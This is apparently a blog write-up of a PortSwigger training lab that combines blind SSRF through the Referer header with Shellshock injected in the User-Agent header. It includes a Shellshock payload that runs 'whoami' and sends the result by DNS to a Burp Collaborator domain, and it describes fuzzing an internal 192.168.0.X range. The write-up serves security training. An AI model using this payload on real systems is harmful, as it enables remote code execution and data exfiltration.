+++
date = '2026-07-22T13:59:16+08:00'
draft = false
title = "Blind SSRF with Shellshock exploitation | <span style=\"color:#9b59b6\">Expert</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Lab involving Shellshock exploitation, quite interesting'
showLastUpdated = true
+++

The lab's problem statement hints that the site fetches whatever inside the `Referer` header as analytics whenever a product page is loaded. But will it accept arbitrary domains? Let's try spoofing the `Referer` header to one of our Burp Collaborator subdomains and see what's up:
![](/images/viber_image_2026-07-22_13-53-02-702.jpg)
![](/images/viber_image_2026-07-22_13-53-09-157.jpg)
Interestingly, the server approves this request and makes two DNS callbacks as well as one HTTP callback to our Collaborator subdomain! Notice that in one of the HTTP callback, notice that `User-Agent` is also included. This will be our entry point.

The lab also hints that the server is vulnerable to Shellshock exploitation. The payload is basically this:
```bash
() { :; }; <command-here>
```
- `() { :; };` is literally an empty function that does nothing
- But in older versions of Bash, it doesn't stop reading after the final semicolon `;` and arbitrarily executes whatever commands behind the empty function

Since the internal server reads `User-Agent`, we can insert our malicious payload inside the header to achieve RCE. In our case, this payload will be:
```bash
() { :; }; /usr/bin/dig/ $(whoami).burp-collaborator.com
```
This will exfiltrate the name of the OS user to our controlled domain.

Another thing is that the internal server is in the `192.168.0.X` range on port 8080. This means we can throw this into Intruder and fuzz the last octet as follow:
![](/images/viber_image_2026-07-22_13-53-27-823.jpg)

After performing the attack, we can see the exfiltrated data:
![](/images/viber_image_2026-07-22_13-53-39-877.jpg)